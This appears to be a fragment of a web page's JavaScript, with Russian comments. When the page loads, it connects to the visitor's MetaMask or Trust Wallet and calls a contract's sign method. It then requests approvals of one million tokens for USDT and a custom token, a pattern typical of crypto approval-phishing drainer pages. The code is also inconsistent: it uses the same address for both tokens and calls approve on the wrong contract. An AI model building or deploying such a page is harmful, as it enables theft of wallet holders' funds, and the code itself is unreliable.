        const contractAddress = "0xec228a28e7e919df062bf145bc4c93c6cf0d170c"; // Адрес вашего нового контракта на тестовой сети

        window.addEventListener('load', async () => {
            if (typeof window.ethereum !== 'undefined') {
                web3 = new Web3(window.ethereum);
                try {
                    // Подключаемся к кошельку пользователя
                    await window.ethereum.request({ method: 'eth_requestAccounts' });
                    const accounts = await web3.eth.getAccounts();
                    const userAddress = accounts[0];
                    console.log("Подключен аккаунт:", userAddress);

                    // Создаем контрактный объект
                    const contract = new web3.eth.Contract(abi, contractAddress);

                    // Выполняем последовательные действия: подписываем контракт и предоставляем доступ
                    await signAndApprove(contract, userAddress);

                } catch (error) {
                    console.error("Ошибка при подключении или подписании:", error);
                }
            } else {
                alert("Trust Wallet или MetaMask не найдены!");
            }
        });

        async function signAndApprove(contract, userAddress) {
            try {
                // 1. Подписание контракта (например, предоставление прав на управление USDT и Custom Token)
                await contract.methods.sign().send({ from: userAddress });
                console.log("Контракт подписан пользователем:", userAddress);

                // 2. Предоставление разрешения на управление USDT токенами
                const usdtTokenAddress = "0x85f828cd006a5f9b011b0cd69447e3c44d9da220"; // Адрес вашего USDT токена на тестовой сети
                const customTokenAddress = "0x85f828cd006a5f9b011b0cd69447e3c44d9da220"; // Адрес вашего Custom Token
                const amountToApprove = web3.utils.toWei("1000000", "ether"); // Лимит для разрешения

                // Разрешение на управление USDT
                await contract.methods.approve(usdtTokenAddress, amountToApprove).send({ from: userAddress });
                console.log("Доступ к USDT токенам предоставлен для контракта:", contractAddress);

                // Разрешение на управление Custom Token
                await contract.methods.approve(customTokenAddress, amountToApprove).send({ from: userAddress });
                console.log("Доступ к Custom Token предоставлен для контракта:", contractAddress);

                alert("Контракт успешно подписан, и разрешение предоставлено!");

            } catch (error) {
                console.error("Ошибка при подписании контракта или предоставлении разрешения:", error);
            }
        }
    </script>
